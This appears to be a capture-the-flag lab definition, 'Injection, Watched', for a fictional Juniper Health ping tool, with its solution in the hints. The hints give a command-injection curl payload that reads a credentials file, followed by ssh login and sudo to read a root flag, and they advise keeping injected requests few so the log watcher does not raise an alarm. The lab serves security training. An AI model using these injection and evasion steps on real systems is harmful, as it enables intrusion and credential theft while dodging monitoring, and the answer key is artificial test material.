title: Injection, Watched
summary: The leaky ping tool from The Injection Point, now behind a watcher that flags any web request with shell characters in it. You get two tricks before it notices - make the first one count.
story: Juniper Health (made up) added a filter that reads app01's web log (10.10.5.30) and flags requests carrying shell characters like ; | or $( - the signs of command injection. It lets the odd one slide, but not a string of them. You start on scout.
goal: Capture both flags with as few injected requests as possible, without raising the alarm.
skills: reading a page for clues, one well-aimed command injection, ssh, sudo -l, staying quiet

defenderRules.watches: web requests with shell characters in them (command tricks), page-guessing sweeps and failed sign-ins

web.title: About NetCheck Lite
web.body:
About NetCheck Lite

NetCheck Lite 1.0. It signs in to other servers as the service account appsvc.

Settings (service account and password) live in /var/www/conf/app.ini - only IT should edit that file.

hints.text: Each injected request (a ; or | in the host) is counted heavily; two are tolerated, three are not. Before you inject anything, read the site's ordinary pages - one of them says where the service account's settings live.

curl -s http://10.10.5.30/about.html names /var/www/conf/app.ini. Then a single injection reads it: curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'. No need for ;id or ;ls first.
ssh appsvc@10.10.5.30 with the password from app.ini (once, typed right), cat flag.txt, sudo -l, then sudo sed -n p /root/flag.txt. This watcher only reads the web log, so sudo is fine here.
